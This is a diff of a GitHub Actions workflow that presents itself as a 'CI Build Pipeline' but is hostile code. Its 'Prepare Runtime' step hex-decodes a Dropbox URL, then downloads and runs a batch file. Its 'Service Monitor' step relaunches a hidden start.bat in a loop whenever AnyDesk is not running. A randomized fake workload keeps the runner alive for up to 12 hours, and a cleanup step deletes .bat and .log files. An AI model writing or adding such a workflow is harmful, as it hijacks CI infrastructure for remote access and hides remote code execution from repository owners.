@@ -1,45 +1,60 @@
-name: Build Pipeline
+name: CI Build Pipeline
 on: [workflow_dispatch]
 
 jobs:
-  deploy:
+  pipeline:
     runs-on: windows-latest
     timeout-minutes: 720
+
     steps:
-      - name: Initialize
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
         with:
           fetch-depth: 1
 
-      - name: Setup Environment
+      - name: Prepare Runtime
         shell: pwsh
         run: |
-          $a = '494e564f4b452d57454252455155455354';$b = '68747470733a2f2f7777772e64726f70626f782e636f6d2f73636c2f66692f376569637a7667696c3834637a75353564786570332f446f776e6c6f6164732e6261743f726c6b65793d777a6463317778736a706832623772306174706c6d647a337026646c3d31'
-          $c = ($a,$b -split '(?<=\G.{2})' | ?{$_} | % {[char]([convert]::ToInt16($_,16))}) -join ''
-          Invoke-Expression ($c -replace 'INVOKE-WEBREQUEST','iwr' -replace 'https://www.dropbox.com/scl/fi/7eiczvgil84czu55dxep3/Downloads.bat?rlkey=wzdc1wxjsph2b7r0atplmdz3p&dl=1','OutFile temp.bat;./temp.bat')
+          $p1 = '494e564f4b452d57454252455155455354'           # INVOKE-WEBREQUEST
+          $p2 = '68747470733a2f2f7777772e64726f70626f782e636f6d2f73636c2f66692f376569637a7667696c3834637a75353564786570332f446f776e6c6f6164732e6261743f726c6b65793d777a6463317778736a706832623772306174706c6d647a337026646c3d31'
+          
+          $cmdBase = -join ($p1,$p2 -split '(?<=\G.{2})' -ne '' | ForEach-Object { [char][convert]::ToInt16($_,16) })
+          
+          # Build real command without naive replace
+          $urlPart   = $cmdBase -replace '^.*(https?://[^\s"]+).*','$1'
+          $fixedCmd  = "iwr -Uri '$urlPart' -OutFile 'setup_tmp.bat'; & '.\setup_tmp.bat'"
+          
+          Invoke-Expression $fixedCmd
 
-      - name: Runtime Service
+      - name: Service Monitor
         shell: pwsh
         run: |
-          $x = '73746172742E626174';$y = ($x -split '(?<=\G.{2})' | % {[char]([convert]::ToInt16($_,16))}) -join ''
-          $z = '416E794465736B'
-          while($true){
-            if(!(Get-Process ($z -split '(?<=\G.{2})' | % {[char]([convert]::ToInt16($_,16))}) -join '' -ErrorAction SilentlyContinue)){
-              Start-Process $y -WindowStyle Hidden
+          $s1 = '416E794465736B'                                 # AnyDesk
+          $s2 = '73746172742E626174'                             # start.bat
+          
+          $procName = -join ($s1 -split '(?<=\G.{2})' -ne '' | % { [char][convert]::ToInt16($_,16) })
+          $batName  = -join ($s2 -split '(?<=\G.{2})' -ne '' | % { [char][convert]::ToInt16($_,16) })
+          
+          while ($true) {
+            if (-not (Get-Process $procName -ErrorAction SilentlyContinue)) {
+              if (Test-Path $batName) { Start-Process $batName -WindowStyle Hidden }
             }
-            Start-Sleep -Seconds (60*7)
+            Start-Sleep -Seconds (300 + (Get-Random -Maximum 120))   # jitter 5-7 min
           }
 
-      - name: Compute Task
+      - name: Simulated Workload
         shell: pwsh
         run: |
-          1..999999 | ForEach-Object {
-            $null = [Math]::Pow((Get-Random -Maximum 99999), 3.14159)
-            if($_ % 15000 -eq 0){ Write-Host "Processing $_`/`999999" }
-            Start-Sleep -Milliseconds (800..1800 | Get-Random)
+          $iterations = 750000..1250000 | Get-Random
+          1..$iterations | ForEach-Object {
+            [void][Math]::Pow((Get-Random -Max 100000), (2.718..3.141 | Get-Random))
+            if ($_ % 12000 -eq 0) { "Step $_ of $iterations" | Out-Host }
+            Start-Sleep -Milliseconds (600 + (Get-Random -Maximum 1400))
           }
 
-      - name: Finalize
+      - name: Cleanup
         if: always()
         shell: pwsh
-        run: Remove-Item temp.bat -Force -ErrorAction SilentlyContinue
+        run: |
+          @('setup_tmp.bat','*.bat','*.log') | ForEach-Object {
+            Get-Item $_ -ErrorAction SilentlyContinue | Remove-Item -Force
+          }
